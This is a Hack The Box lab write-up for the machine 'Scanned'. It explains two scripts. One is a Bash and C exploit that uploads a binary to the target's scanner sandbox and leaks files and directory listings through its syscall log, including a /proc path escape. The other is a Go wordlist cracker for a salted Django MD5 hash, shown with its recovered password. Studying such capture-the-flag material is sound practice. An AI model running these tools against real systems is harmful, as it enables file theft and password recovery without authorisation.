# Hack The Box. Machines. Scanned

Machine write-up: https://7rocky.github.io/en/htb/scanned

### `exploit.sh`

This Bash script is used to list directories and read files from the server. It has a C program embedded because we need to upload a compiled binary to the server in order to exfiltrate the information.

First of all, to use this script we must provide some parameters:

```bash
function help() {
        echo "[!] Usage: bash $0 <host> <f|d> <path-to-file|dir>"
	      exit 1
}

host=$1

if [ "$2" = "f" ]; then
	      read_file=1
	      file=$3
elif [ "$2" = "d" ]; then
        read_file=0
	      dir=$3
else
	      help
fi
```

So we need to enter the host IP address where the web server is listening, then `f` to read a file or `d` to list a directory and finally the path.

After that, the C program is compiled. Then we upload it and filter the results as shown in the [write-up](https://7rocky.github.io/en/htb/scanned) (a bit enhanced here because of some edge cases):

```bash
res=$(curl $host/scanner/upload/ -sLF file=@exploit)

hex=$(echo "$res" \
        | grep execve \
        | awk -F = '{ print $3 }' \
        | sed 's/<\/pre>//g' \
        | awk -F x '{ printf "%16s\n", $2 }' \
        | tr ' ' 0)

echo "$hex" | xxd -r -p
echo
```

The file we upload is called `exploit`, which is the compiled binary from the C code.

For the C code, what's important to notice is that we need to output the information in parts of 8 bytes (the [write-up](https://7rocky.github.io/en/htb/scanned) shows how the information is exfiltrated). In order to do that, we have a function called `read_file`:

```c
void read_file(char* path) {
  unsigned long ret = 0l;
  char ret_string[8] = {0, 0, 0, 0, 0, 0, 0, 0};
  int fd = open(path, O_RDONLY);

  while (read(fd, ret_string, 8)) {
    ret = 0l;

    for (int i = 0; i < 8; i++) {
      ret <<= 8;
      ret += ret_string[i];
      ret_string[i] = 0;
    }

    log_syscall(ret);
  }

  close(fd);
}
```

Basically, it takes a file path and reads 8 bytes from it. The 8 bytes are stored in `ret_string`, which is a `char` array. In order to transform the string into a decimal number, we use the `ret` variable, where we shift 8 bits to the left and add the next byte of `ret_string`. Finally, we use `log_syscall` (from the machine's source code) to output the exfiltrated information.

To list directories we can output the listing into a file called `tmp_file` and then use `read_file` to exfiltrate the information. So this is the `main` function:

```c
int main() {
  DIR* dr;
  struct dirent *de;
  FILE* fp;
  int do_read_file = $do_read_file;

  if (do_read_file) {
    read_file("$file");
    return 0;
  }

  fp = fopen("tmp_file", "wb");
  dr = opendir("$dir");

  while ((de = readdir(dr)) != NULL) {
    fprintf(fp, "%s\n", de->d_name);
  }

  closedir(dr);
  fclose(fp);

  read_file("tmp_file");
  return 0;
}
```

Notice that `$do_read_file`, `$file` and `$dir` are not valid C variables but Bash variables. However, this C code is wrapped in a "heredoc" so we can use string interpolation in Bash to print the contents of those variables, so that the C code is valid and compiles correctly using this syntax:

```bash
gcc -o exploit -xc - <<- __EOF__
  // C code
__EOF__
```

An example of execution could be this one:

```console
$ bash exploit.sh d /
[!] Usage: bash exploit.sh <host> <f|d> <path-to-file|dir>

$ bash exploit.sh 10.10.11.141 d /
tmp_file
.
log
lib
..
proc
userprog
lib64
usr
bin

$ bash exploit.sh 10.10.11.141 f /proc/1/fd/3/../../../../../etc/hostname
scanned
```

### `crack.go`

This script is used to crack a hashed password in Django format:

```plaintext
md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf
```

This hash is composed of three parts (divided by `$`), which is parsed in the script:

```go
	full_hash := os.Args[2]
	splitted_hash := strings.Split(full_hash, "$")
	alg, salt, hash := splitted_hash[0], splitted_hash[1], splitted_hash[2]

	fmt.Printf("[*] Algorithm: \t %s\n", alg)
	fmt.Printf("[*] Salt: \t %s\n", salt)
	fmt.Printf("[*] Hash: \t %s\n\n", hash)
```

Once done, we open the wordlist file and begin computing hashes using the same algorithm and salt until we find a coincidende:

```go
	file, err := os.Open(os.Args[1])

	if err != nil {
		fmt.Printf("File '%s' not found\n", os.Args[1])
	}

	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		password := scanner.Text()

		if crack(salt, password) == hash {
			fmt.Println("[+] Cracked:", password)
			break
		}
	}
```

The function that computes the hash is called `crack`:

```go
func crack(salt, password string) string {
	return fmt.Sprintf("%x", md5.Sum([]byte(salt+password)))
}
```

We can run it like this:

```console
$ go run crack.go
Usage: go run crack.go <wordlist> <hash>
exit status 1

$ go run crack.go $WORDLISTS/rockyou.txt 'md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf'
[*] Algorithm:   md5
[*] Salt:        kL2cLcK2yhbp3za4w3752m
[*] Hash:        9886e17b091eb5ccdc39e436128141cf

[+] Cracked: onedayyoufeellikecrying
```
